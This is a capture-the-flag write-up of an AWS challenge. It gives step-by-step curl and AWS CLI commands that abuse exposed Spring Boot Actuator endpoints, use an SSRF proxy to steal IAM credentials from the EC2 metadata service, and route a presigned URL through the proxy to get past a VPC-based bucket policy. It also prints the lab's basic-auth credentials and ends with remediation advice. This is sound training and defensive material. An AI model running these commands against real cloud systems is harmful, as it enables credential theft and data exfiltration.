# CTF Write-Up: Wiz Cloud Security Championship — Perimeter Leak

**Date:**  26/05/2026

**Platform:** Wiz Cloud Security Championship

**Challenge:** Perimeter Leak

**Difficulty:** Hard

**Category:** Cloud Security / AWS / SSRF / Data Perimeter Bypass

**Status:** ✅ Completed — Flag Captured

---

## Objective

Extract a secret flag from an S3 bucket protected by an AWS data 
perimeter; a layered defence combining IAM roles, S3 bucket policies, 
and VPC network controls; starting from a jump server with no AWS 
credentials.

---

## Attack Chain

Jump Server (no creds)

    → Spring Boot Actuator (exposed management endpoints)
    
        → /actuator/env (bucket name + SSRF endpoint discovery)
        
            → /actuator/mappings (/proxy SSRF vector)
            
                → EC2 Metadata Service (IMDSv2 credential theft)
                
                    → IAM Role Credentials (inside perimeter)
                    
                        → Presigned URL routed through proxy
                        
                            → FLAG

---

## Tools Used

- Kali Linux
- AWS CLI
- curl
- Spring Boot Actuator (target's misconfigured management interface)

---

## My Methodology

### Phase 1 — Jump Server Recon

The jump server had no AWS credentials. Running 
`aws sts get-caller-identity` failed immediately. 

However, inspecting environment variables revealed a Spring Boot application 
running at `https://challenge01.cloud-champions.com` with embedded 
basic auth credentials exposed in an `INFO_MSG` environment variable.

```bash
env | grep -i aws
```

**Spring Boot Actuator** is a management interface that, when 
misconfigured, exposes sensitive internal data including environment 
variables, config properties, and all registered HTTP routes.

---

### Phase 2 — Spring Boot Actuator Exploitation

**Confirming full actuator exposure:**

```bash
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator

BASE="https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com"

```

All endpoints were exposed due to a misconfigured `application.properties`:

```properties
management.endpoints.web.exposure.include=*
management.endpoint.env.show-values=always
```

**Extracting environment variables from `/actuator/env`:**

```bash
curl $BASE/actuator/env
```

Key findings:

| Variable | Value | Why It Matters |
|---|---|---|
| `BUCKET` | `challenge01-470f711` | Target S3 bucket name |
| `user.name` | `ec2-user` | Confirms this is an EC2 instance |
| No `AWS_ACCESS_KEY_ID` present | — | Auth is via IAM Instance Profile, not hardcoded keys |

The absence of hardcoded credentials confirmed the app authenticates 
to AWS via an **IAM Instance Profile** — credentials fetched 
automatically from the EC2 Instance Metadata Service (IMDS).

**Discovering the SSRF vector from `/actuator/mappings`:**

```bash
curl $BASE/actuator/mappings
```

A custom route was registered in the application:

```json
{ "predicate": "{ [/proxy], params [url]}" }
```

This is a **Server-Side Request Forgery (SSRF) vector** — an endpoint 
that fetches any URL on behalf of the server. Since the server is 
an EC2 instance, it can reach the link-local metadata service at 
`169.254.169.254`, which is unreachable from outside AWS.

---

### Phase 3 — IMDSv2 Credential Theft via SSRF

IMDSv2 requires a two-step token-based flow. A plain GET returns 
`401 Unauthorized` — confirming IMDSv2 is enforced.

**Step 1 — Obtain IMDSv2 session token:**

```bash
curl -X PUT "$BASE/proxy?url=http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

The proxy forwarded the PUT request and custom header to the metadata 
service — returning a valid session token.

**Step 2 — Retrieve the IAM role name:**

```bash
curl "$BASE/proxy?url=http://169.254.169.254/latest/meta-data/\
iam/security-credentials/" \
     -H "X-aws-ec2-metadata-token: $TOKEN"
```

Result: `challenge01-5592368`

**Step 3 — Steal live temporary credentials:**

```bash
curl "$BASE/proxy?url=http://169.254.169.254/latest/meta-data/\
iam/security-credentials/challenge01-5592368" \
     -H "X-aws-ec2-metadata-token: $TOKEN"
```

Result: A full set of STS temporary credentials — `AccessKeyId`, 
`SecretAccessKey`, and `SessionToken` — valid for the session 
duration and carrying all permissions of role `challenge01-5592368`.

---

### Phase 4 — Hitting the Data Perimeter

I loaded the stolen credentials and located the flag:

```bash
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws s3 ls s3://challenge01-470f711/private/
# → flag.txt confirmed
```

Direct download was blocked:

```bash
aws s3 cp s3://challenge01-470f711/private/flag.txt .
```

AccessDenied: explicit deny in a resource-based policy

**Why:** The bucket policy contained an explicit deny on the `private/` 
prefix for any request **not** originating from within the trusted VPC. 
My request came from the jump server — outside the VPC — and was 
denied regardless of IAM permissions.

AWS evaluates permissions in this order:

Explicit DENY  →  overrides everything, no exceptions
Explicit ALLOW →  granted only if no deny exists
Implicit DENY  →  default if no rule matches

---

### Phase 5 — Data Perimeter Bypass via Presigned URL

**The insight:** A file `hello.txt` at the bucket root returned 
*"Welcome to the proxy server"* — the same message as the Spring 
app's root endpoint. The proxy server IS the EC2 instance inside 
the trusted VPC. The bucket policy allows requests originating 
from inside that VPC.

**The technique:** A presigned URL embeds AWS credentials as query 
parameters, allowing any HTTP client to make an authenticated S3 
request. If I generate the presigned URL on the jump server 
(using the stolen credentials) and then route it through the 
internal `/proxy` endpoint, the EC2 instance makes the S3 request 
from inside the VPC — satisfying the network condition in the 
bucket policy.

**Generate the presigned URL:**

```bash
PRESIGNED=$(aws s3 presign s3://challenge01-470f711/private/flag.txt \
    --expires-in 300)
```

**Route it through the internal proxy:**

```bash
curl -G "$BASE/proxy" --data-urlencode "url=$PRESIGNED"
```

`--data-urlencode` safely encodes the presigned URL (which contains 
`&` and `=` characters) as a single query parameter without breaking 
the request.

**Result:**

The flag is: ************************************

---

## Screenshots

![Jump Server — env Output Revealing Spring Boot URL](01-env-variable-discovery.png)
![Actuator /env — Bucket Name and No Hardcoded Keys](02-actuator-env-output.png)
![Actuator /mappings — /proxy SSRF Endpoint Discovered](03-actuator-mappings-proxy.png)
![IMDSv2 Token Retrieved via SSRF PUT Request](04-imdsv2-token-retrieval.png)
![IAM Role Name Retrieved via Metadata SSRF](05-iam-role-name.png)
![Temporary Credentials Stolen via SSRF](06-credentials-stolen.png)
![Temporary Credentials Stolen via SSRF](07-credentials-stolenII.png)
![Direct S3 Access — AccessDenied from Data Perimeter](08-s3-access-denied.png)
![Presigned URL Generated on Jump Server](09-presigned-url-generated.png)
![Presigned URL Routed Through Proxy — Flag Retrieved](10-flag-captured.png)

---

## Key Concept: Why the Bypass Worked

A data perimeter restricts **where** a request originates, not 
**what format** the request uses. Presigned URLs embed credentials 
as query parameters — the actual HTTP request can be made by any 
client. By routing the presigned URL through the EC2 instance's 
proxy, the S3 service saw the request as originating from inside 
the VPC, satisfying the `aws:SourceVpc` condition in the bucket 
policy — even though the credentials were generated outside the VPC.

---

## AWS Concepts Demonstrated

| Concept | How It Appeared in This Challenge |
|---|---|
| IAM Instance Profiles | EC2 auto-fetches credentials from IMDS — no hardcoded keys needed |
| IMDSv2 | Token-based two-step flow required — but SSRF bypassed it |
| SSRF | /proxy endpoint reached internal metadata service unreachable from outside |
| AWS Data Perimeters | Bucket policy with `aws:SourceVpc` explicit deny on private/ prefix |
| Permission Evaluation | Explicit deny overrides all allows — no exceptions |
| Presigned URLs | Credentials embedded as URL parameters — decouples signing from request origin |
| Spring Boot Actuator | Misconfigured management endpoints leaked bucket name and exposed SSRF vector |

---

## Remediation

| Vulnerability | Fix |
|---|---|
| Actuator fully exposed | Disable in production or restrict to `localhost` only |
| `/actuator/env` showing values | Set `show-values=never` in `application.properties` |
| Unrestricted `/proxy` endpoint | Allowlist permitted destination URLs — block `169.254.x.x` explicitly |
| Presigned URL perimeter bypass | Add `aws:PrincipalArn` conditions alongside `aws:SourceVpc` to prevent trusted-role presigned URLs from being routed by untrusted callers |
| No VPC endpoint policy | Restrict which IAM roles can use the S3 VPC endpoint |

---

## What I Learned

- **Spring Boot Actuator with `show-values=always` is a critical 
  misconfiguration** — it turns a management endpoint into a 
  full credential and config dump
- **SSRF against IMDSv2 is still possible if the application 
  supports PUT requests with custom headers** — IMDSv2 protects 
  against basic GET-based SSRF but not against a proxy that 
  faithfully forwards all HTTP methods and headers
- **An explicit deny in a bucket policy is not a complete 
  data perimeter** if presigned URLs are in scope — the perimeter 
  needs to account for how trusted roles' credentials can be used 
  outside the trusted network
- **Presigned URLs decouple signing from request origin** — 
  whoever generates the URL controls the credentials embedded 
  in it; wherever the URL is sent controls the network origin 
  of the final request
